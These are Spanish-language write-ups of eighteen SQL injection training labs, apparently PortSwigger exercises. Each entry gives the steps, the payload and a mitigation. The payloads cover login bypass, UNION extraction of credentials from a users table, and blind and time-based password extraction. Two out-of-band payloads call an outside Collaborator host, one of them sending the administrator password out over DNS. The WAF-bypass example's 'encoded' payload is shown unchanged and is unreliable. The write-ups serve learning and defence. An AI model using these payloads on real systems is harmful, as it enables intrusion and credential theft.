01

SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Apprentice In-band (WHERE clause)

Objetivo

Explotar una vulnerabilidad para recibir todos los documentos que aún no han sido publicados.

Explicación técnica

La aplicación no filtra el parámetro category antes de incluirlo en la consulta SQL. Esto permite alterar la lógica de la consulta original para omitir los filtros de visibilidad impuestos por el desarrollador y devolver el conjunto completo de datos.

Procedimiento

  1. Acceder a la página de una categoría para identificar el parámetro de filtrado.
  2. Modificar la URL inyectando una condición lógica siempre verdadera.
  3. El servidor procesa la consulta alterada y devuelve todos los registros, incluidos los ocultos.

Payload utilizado

Pets' OR 1=1--

Análisis: La comilla simple cierra la cadena original. El operador OR 1=1 fuerza a que la cláusula WHERE sea siempre verdadera. Los guiones finales comentan el resto de la lógica del servidor.

Mitigación

Implementación de consultas parametrizadas (sentencias preparadas), tratando las entradas del usuario estrictamente como datos y no como parte del código ejecutable.
02

SQL injection vulnerability allowing login bypass

Apprentice In-band (Evasión de Autenticación)

Objetivo

Explotar una vulnerabilidad en las credenciales para iniciar sesión como administrador.

Explicación técnica

El sistema concatena directamente los valores de los campos de inicio de sesión en la consulta SQL. Al manipular el campo de usuario, se puede engañar a la base de datos para que autentique al atacante sin validar la contraseña.

Procedimiento

  1. Interceptar la petición POST del formulario de login.
  2. Introducir el nombre de usuario de administración seguido de un operador de comentario.
  3. Enviar la petición para omitir la verificación del campo password.

Payload utilizado

administrator'--

Análisis: Se especifica el usuario objetivo y se añade '-- para anular la validación de la contraseña en la instrucción SQL, permitiendo el acceso exitoso.

Mitigación

Uso mandatorio de sentencias preparadas para desacoplar la lógica de autenticación de los valores ingresados por el usuario.
03

SQL injection attack, querying the database type and version on Oracle

Practitioner Union-based

Objetivo

Obtener la versión del motor de base de datos Oracle.

Explicación técnica

La vulnerabilidad permite realizar un ataque de unión para extraer metadatos del servidor. En Oracle, es necesario consultar tablas del sistema como v$version y cumplir con la estructura de la consulta original.

Procedimiento

  1. Identificar el número de columnas devueltas por la consulta original.
  2. Utilizar el operador UNION para llamar a la tabla v$version.
  3. Visualizar la información de la versión en la respuesta HTTP.

Payload utilizado

' UNION SELECT BANNER, NULL FROM v$version--

Análisis: El comando extrae la columna BANNER de la tabla de sistema de Oracle. Se añade NULL para igualar el número de columnas requeridas.

Mitigación

Implementar validación de entradas mediante listas blancas y consultas parametrizadas.
04

SQL injection attack, querying the database type and version on MySQL and Microsoft

Practitioner Union-based

Objetivo

Consultar y mostrar la versión del sistema gestor de base de datos (MySQL/Microsoft).

Explicación técnica

Al carecer de validación en el parámetro category, se inyecta una instrucción UNION SELECT que permite visualizar variables globales del sistema que exponen la versión del servidor.

Procedimiento

  1. Interceptar la petición en Burp Suite y enviarla al Repeater.
  2. Determinar el número de columnas usando ORDER BY.
  3. Inyectar la variable de sistema correspondiente a la versión.

Payload utilizado

Pets' UNION SELECT NULL, @@version--

Análisis: Se utiliza @@version para extraer la versión en MySQL/MS SQL. Los valores NULL aseguran la compatibilidad de columnas.

Mitigación

Separar los datos de entrada del código ejecutable mediante sentencias preparadas y aplicar el principio de menor privilegio.
05

SQL injection UNION attack, determining the number of columns returned by the query

Practitioner Union-based (Reconocimiento)

Objetivo

Determinar el número exacto de columnas devueltas por una consulta SQL inyectada.

Explicación técnica

Un ataque UNION requiere que la consulta inyectada tenga el mismo número de columnas que la original. Se utiliza una técnica iterativa de valores NULL para mapear la estructura.

Procedimiento

  1. Interceptar la petición de filtrado en Burp Suite.
  2. Inyectar de forma incremental cláusulas UNION SELECT NULL, NULL... hasta obtener un 200 OK.

Payload utilizado

' UNION SELECT NULL, NULL, NULL--

Análisis: El valor NULL es compatible con casi cualquier tipo de dato, permitiendo descubrir la arquitectura sin causar conflictos de tipos.

Mitigación

Empleo de consultas parametrizadas para evitar que el motor de base de datos interprete operadores SQL en la entrada.
06

SQL injection UNION attack, finding a column containing text

Practitioner In-band (UNION)

Objetivo

Identificar qué columna de la consulta original permite mostrar datos de tipo texto.

Explicación técnica

Tras conocer el número de columnas, es vital saber cuál puede renderizar cadenas para exfiltrar datos. Se prueban valores literales de texto en cada posición de la consulta UNION.

Procedimiento

  1. Realizar una inyección UNION SELECT con el número de columnas conocido.
  2. Sustituir secuencialmente cada NULL por una cadena de prueba (ej. 'abc').
  3. Si el servidor no devuelve error, esa columna es apta para texto.

Payload utilizado

' UNION SELECT NULL, 'abc', NULL--

Análisis: La cadena 'abc' intenta ser procesada por la segunda columna. El éxito indica compatibilidad de tipos para futura exfiltración.

Mitigación

Implementar validación estricta de entradas mediante listas blancas para que el parámetro solo acepte valores esperados.
07

SQL injection UNION attack, retrieving data from other tables

Practitioner In-band (Exfiltración)

Objetivo

Extraer nombres de usuario y contraseñas de la tabla users.

Explicación técnica

Se aprovecha la falta de aislamiento de permisos en la base de datos. La aplicación permite usar UNION para cruzar los límites de la tabla de productos y acceder a la tabla de usuarios sensibles.

Procedimiento

  1. Confirmar número de columnas y compatibilidad de texto.
  2. Inyectar una consulta UNION dirigida a la tabla users.
  3. Localizar las credenciales del administrador en el cuerpo de la respuesta.

Payload utilizado

' UNION SELECT username, password FROM users--

Análisis: El operador UNION fusiona los resultados de la tabla users con los de productos, volcando las credenciales directamente en el HTML de la página.

Mitigación

Aplicar el principio de menor privilegio, asegurando que la cuenta de la aplicación no tenga permisos de lectura sobre tablas administrativas.
08

SQL injection UNION attack, retrieving multiple values in a single column

Practitioner Union-based

Objetivo

Recuperar múltiples valores de diferentes columnas (usuario y contraseña) dentro de una sola columna de resultados.

Explicación técnica

Cuando la consulta original solo permite mostrar texto en una columna, se utiliza la concatenación de strings para unir varios campos en uno solo antes de enviarlos a la interfaz.

Procedimiento

  1. Determinar la columna apta para texto.
  2. Utilizar el operador de concatenación específico de la base de datos (|| o CONCAT).
  3. Extraer la cadena combinada que contiene las credenciales.

Payload utilizado

' UNION SELECT NULL, username || '~' || password FROM users--

Análisis: Concatena el usuario y la contraseña con un separador (~), permitiendo que ambos datos viajen a través de un único campo de texto.

Mitigación

Deshabilitar la concatenación dinámica en consultas y migrar a procedimientos almacenados seguros.
09

SQL injection attack, listing the database contents on non-Oracle databases

Practitioner In-band (Information Schema)

Objetivo

Listar tablas y columnas para descubrir la estructura interna de una base de datos no-Oracle.

Explicación técnica

Se accede al information_schema, una base de datos maestra que contiene los nombres de todas las tablas y columnas, permitiendo al atacante mapear el entorno antes del robo de datos.

Procedimiento

  1. Inyectar UNION SELECT table_name, NULL FROM information_schema.tables para listar tablas.
  2. Identificar la tabla de usuarios y sus columnas mediante information_schema.columns.
  3. Realizar la exfiltración final con los nombres descubiertos.

Payload utilizado

' UNION SELECT table_name, NULL FROM information_schema.tables--

Análisis: Consulta los metadatos globales del servidor para revelar nombres de tablas que el desarrollador intentó mantener ocultos.

Mitigación

Restringir el acceso del usuario de la aplicación a las tablas de metadatos del sistema.
10

SQL injection attack, listing the database contents on Oracle

Practitioner In-band (Oracle Catalog)

Objetivo

Listar el contenido de una base de datos Oracle para identificar tablas de usuarios.

Explicación técnica

A diferencia de otros sistemas, Oracle utiliza tablas como all_tables y all_tab_columns. El ataque debe adaptarse a esta sintaxis específica de catálogo.

Procedimiento

  1. Consultar all_tables para encontrar tablas sospechosas.
  2. Consultar all_tab_columns filtrando por el nombre de la tabla encontrada.
  3. Extraer los datos de las columnas identificadas.

Payload utilizado

' UNION SELECT table_name, NULL FROM all_tables--

Análisis: Fuerza al motor Oracle a devolver los nombres de todas las tablas accesibles por el usuario actual.

Mitigación

Implementar auditorías de consultas y endurecimiento (hardening) de la base de datos Oracle.
11

Blind SQL injection with conditional responses

Practitioner Blind (Boolean-based)

Objetivo

Extraer la contraseña del administrador mediante respuestas de "verdadero o falso".

Explicación técnica

La aplicación no muestra resultados directos, pero su respuesta varía dependiendo de si la consulta SQL es exitosa. Se realizan preguntas booleanas carácter por carácter.

Procedimiento

  1. Identificar el parámetro vulnerable (ej. TrackingId).
  2. Inyectar condiciones como AND SUBSTRING(password,1,1)='a'.
  3. Analizar los cambios en la respuesta HTTP para deducir cada carácter.

Payload utilizado

TrackingId=xyz' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='administrator')='a

Análisis: Si la primera letra de la contraseña es 'a', la condición es verdadera y la página carga normalmente, confirmando el dato de forma indirecta.

Mitigación

Uso estricto de consultas parametrizadas y ofuscación de respuestas genéricas para eliminar el canal de fuga booleano.
12

Blind SQL injection with conditional errors

Practitioner Blind (Error-based)

Objetivo

Inducir errores controlados para confirmar datos cuando no hay cambios visibles en la página.

Explicación técnica

Algunas bases de datos como Oracle permiten usar funciones que lanzan errores (como TO_CHAR(1/0)) solo si se cumple una condición, permitiendo exfiltrar datos mediante códigos de error 500.

Procedimiento

  1. Inyectar una instrucción CASE que evalúe la contraseña.
  2. Forzar una división por cero si la condición es verdadera.
  3. Identificar el carácter correcto cuando el servidor devuelve un Internal Server Error.

Payload utilizado

'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

Análisis: El uso de TO_CHAR(1/0) genera un error matemático que detiene la ejecución del servidor, sirviendo como señal booleana.

Mitigación

Deshabilitar mensajes de error detallados en producción y parametrizar todas las consultas.
13

Visible error-based SQL injection

Practitioner Error-based (Exfiltración)

Objetivo

Lograr que el motor de base de datos revele el contenido del campo password dentro del propio mensaje de error.

Explicación técnica

Se aplica una función de conversión de tipos (CAST) sobre una subconsulta. Al intentar convertir texto a un número entero, el mensaje de error de PostgreSQL muestra explícitamente la cadena fallida (la contraseña).

Procedimiento

  1. Interceptar la petición de la cookie TrackingId.
  2. Inyectar un payload que fuerce un error de conversión de tipos.
  3. Leer la contraseña del administrador directamente desde el mensaje de error detallado del servidor.

Payload utilizado

' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

Análisis: Obliga a evaluar una comparación booleana donde el CAST a entero falla, provocando que la base de datos "grite" la contraseña en la respuesta HTTP.

Mitigación

Deshabilitar la visualización de errores detallados en producción y utilizar sentencias preparadas.
14

Blind SQL injection with time delays

Practitioner Time-based Blind

Objetivo

Confirmar la vulnerabilidad logrando que la aplicación pause su respuesta durante 10 segundos.

Explicación técnica

Cuando no hay cambios visuales ni errores, se inyectan funciones de retardo (como pg_sleep). El tiempo de respuesta del servidor se convierte en el canal de salida para confirmar la ejecución de código.

Procedimiento

  1. Identificar la cookie TrackingId en el proxy.
  2. Inyectar el comando de retardo específico para PostgreSQL.
  3. Verificar que el tiempo de respuesta sea superior a 10,000 ms.

Payload utilizado

'; SELECT pg_sleep(10)--

Análisis: Detiene la ejecución de la consulta por 10 segundos. No devuelve datos, pero confirma el control total sobre el motor SQL.

Mitigación

Implementar validación de entradas y configurar tiempos de espera (timeouts) estrictos en la base de datos.
15

Blind SQL injection with time delays and information retrieval

Practitioner Time-based Blind (Exfiltración)

Objetivo

Recuperar la contraseña del administrador utilizando retardos de tiempo condicionales.

Explicación técnica

Se combina la lógica booleana con funciones de tiempo. El servidor solo "duerme" si la suposición sobre un carácter de la contraseña es correcta, permitiendo la exfiltración lenta pero efectiva.

Procedimiento

  1. Utilizar una estructura IF o CASE dentro de la inyección.
  2. Evaluar cada carácter: IF (SUBSTR(password,1,1)='a') pg_sleep(5).
  3. Automatizar con Burp Intruder para medir los tiempos de respuesta de cada petición.

Payload utilizado

' || (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--

Análisis: La pausa de 5 segundos solo ocurre ante un acierto, permitiendo reconstruir la contraseña bit a bit.

Mitigación

Aplicar filtros de red y consultas parametrizadas para neutralizar la ejecución de funciones de sistema.
16

Blind SQL injection with out-of-band interaction

Practitioner Blind Out-of-Band (OAST)

Objetivo

Provocar una interacción DNS externa desde el servidor vulnerable hacia Burp Collaborator.

Explicación técnica

Se utiliza la capacidad de la base de datos para realizar consultas de red. Al inyectar una función que resuelve un dominio externo, se confirma la vulnerabilidad incluso si el servidor es totalmente "ciego" a nivel HTTP.

Procedimiento

  1. Generar un subdominio en Burp Collaborator.
  2. Inyectar una subconsulta que realice un lookup DNS hacia ese dominio.
  3. Verificar la recepción de la solicitud DNS en el panel de Collaborator.

Payload utilizado

'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR/"> %remote;]>'),'/l') FROM dual)--

Análisis: Utiliza entidades XML para forzar una petición externa HTTP/DNS, saltando las limitaciones de la respuesta del servidor web.

Mitigación

Restringir las conexiones salientes del servidor de base de datos a nivel de firewall de red (egress filtering).
17

Blind SQL injection with out-of-band data exfiltration

Practitioner Blind Out-of-Band con exfiltración

Objetivo

Extraer la contraseña del administrador enviándola como parte de un subdominio DNS.

Explicación técnica

Es la técnica más avanzada de exfiltración. Se concatena la información robada (contraseña) con un dominio controlado por el atacante. El servidor DNS registra el subdominio, que contiene los datos sensibles.

Procedimiento

  1. Capturar la cookie TrackingId y enviarla al Repeater.
  2. Construir una consulta que recupere la contraseña y la adjunte a un dominio de Collaborator.
  3. Recuperar la contraseña desde los logs de interacción DNS en Burp.

Payload utilizado

'||(SELECT password FROM users WHERE username='administrator')||'.burp-collaborator.net--

Análisis: La base de datos intenta resolver la dirección completa, exponiendo la contraseña del administrador al servidor DNS del atacante.

Mitigación

Deshabilitar funciones de red en la base de datos y utilizar validación estricta en todas las cookies de rastreo.
18

SQL injection with filter bypass via XML encoding

Practitioner WAF Bypass / XML Injection

Objetivo

Explotar una inyección SQL protegida por un WAF mediante técnicas de codificación XML.

Explicación técnica

El WAF bloquea patrones comunes de SQLi. Sin embargo, al estar los datos contenidos en un formato XML, se puede codificar el payload en entidades hexadecimales que el firewall no reconoce, pero que la aplicación decodifica y ejecuta.

Procedimiento

  1. Identificar que el parámetro viaja dentro de etiquetas XML.
  2. Utilizar la extensión Hackvertor de Burp para convertir el payload SQL a entidades hexadecimales XML.
  3. Enviar el payload codificado para evadir el WAF y extraer las credenciales.

Payload utilizado

SELECT * FROM users → SELECT * FROM users

Análisis: La codificación oculta las palabras clave del ataque. El servidor web procesa el XML, decodifica el valor y lo entrega de forma insegura al motor SQL.

Mitigación

No depender únicamente de WAFs basados en firmas. Implementar defensa en profundidad con consultas parametrizadas en el backend.
